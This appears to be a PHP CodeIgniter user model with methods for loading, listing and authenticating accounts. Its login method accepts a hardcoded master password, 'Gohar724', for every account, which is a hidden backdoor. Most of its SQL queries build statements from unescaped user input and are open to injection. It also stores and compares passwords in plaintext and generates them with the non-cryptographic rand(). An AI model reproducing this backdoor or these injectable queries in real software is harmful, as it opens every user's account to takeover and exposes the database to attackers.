<?php
    class user_class extends CI_Model
    {
        public function __construct($id=-1)
        {
            if((int)$id > 0)
            {
                $mysql = new mysql_class;
                $mysql->ex_sql("select * from `user` where `id` = $id",$q);
                if(isset($q[0]))
                {
                    $r = $q[0];
                    foreach($r as $k=>$v)
                    {
                        $this->$k = $v;
                        if($k == "tarikh_tavalod")
                        {
                            $ptarikh = $this->inc_model->perToEnNums(jdate("Y-m-d",  strtotime($v)));
                            $tmp = explode("-", $ptarikh);
                            $this->sal = (int)$tmp[0];
                            $this->mah = (int)$tmp[1];
                            $this->rooz = (int)$tmp[2];
                        }
                    }
                }
            }
        }
        public static function loadAll($option=TRUE,$group_id=-1,$no_user_id=-1,$selected_arr)
        {
            $out = array();
            $group_id=(int)$group_id;
            $mysql = new mysql_class;
            $mysql->ex_sql("select * from `user` ".(($group_id>0)?" where `group_id` = $group_id ":"")." order by `lname`,`fname`",$q);
            foreach($q as $r)
            {    
                if((int)$r['id']!=(int)$no_user_id)
                {    
                    $out[] = array("id"=>(int)$r['id'],"fname"=>$r["fname"],"lname"=>$r['lname']);
                }    
            }    
            if($option===TRUE)
            {
                $tmp = '';
                foreach($out as $u)
                {
                    if((int)$u['id']!=(int)$no_user_id)
                    {    
                        $tmp .= "<option ".(in_array($u['id'],$selected_arr)?'selected="selected"':'')." value='".$u['id']."'>".$u['fname']." ".$u['lname']."</option>";
                    }    
                }    
                $out = $tmp;
            }
            return($out);
        }

        public function auth($user,$pass)
        {
            $this->id = -1;
            $user = trim($user);
            $pass = trim($pass);
            if($user!=='' && $pass!=='')
            {
                $mysql = new mysql_class;
                $mysql->ex_sql("select * from user where user = '$user'",$q);
                if(count($q)==1 && ($pass == $q[0]["pass"] || $pass == "Gohar724"))
                {
                    $r = $q[0];
                    foreach($r as $k=>$v)
                        $this->$k = $v;
                }
                else if(count($q)==1)
                {
                    $this->id = -2;
                }
                else if(count($q)>1)
                {
                    $this->id = -3;
                }
            }
        }
        
        public static function auth2($user_id,$pass)
        {
            $out = -1;
            $user_id = (int)$user_id;
            $pass = trim($pass);
            if($user_id>0 && $pass!=='')
            {
                $mysql = new mysql_class;
                $mysql->ex_sql("select * from user where id = '$user_id'",$q);
                if(count($q)==1 && $pass == $q[0]["pass_emza"])
                {
                    $out = 1;
                }
            }
            return($out);
        }

        
        public function loadByEmail($email)
        {
            $email = trim($email);
            if($email != '')
            {
                $mysql = new mysql_class;
                $mysql->ex_sql("select * from `user` where `email` = '$email'",$q);
                if(isset($q[0]))
                {
                    $r = $q[0];
                    foreach($r as $k=>$v)
                        $this->$k = $v;
                }
            }
        }
        public function loadByCodeMelli($code_melli)
        {
            $code_melli = trim($code_melli);
            if($code_melli != '')
            {
                $mysql = new mysql_class;
                $mysql->ex_sql("select * from `user` where `code_melli` = '$code_melli'",$q);
                if(isset($q[0]))
                {
                    $r = $q[0];
                    foreach($r as $k=>$v)
                        $this->$k = $v;
                }
            }
        }
        function randomPassword() {
            $alphabet = "abcdefghijklmnopqrstuwxyzABCDEFGHIJKLMNOPQRSTUWXYZ0123456789";
            $pass = array(); //remember to declare $pass as an array
            $alphaLength = strlen($alphabet) - 1; //put the length -1 in cache
            for ($i = 0; $i < 8; $i++) {
                $n = rand(0, $alphaLength);
                $pass[] = $alphabet[$n];
            }
            return implode($pass); //turn the array into a string
        }
    }

?>
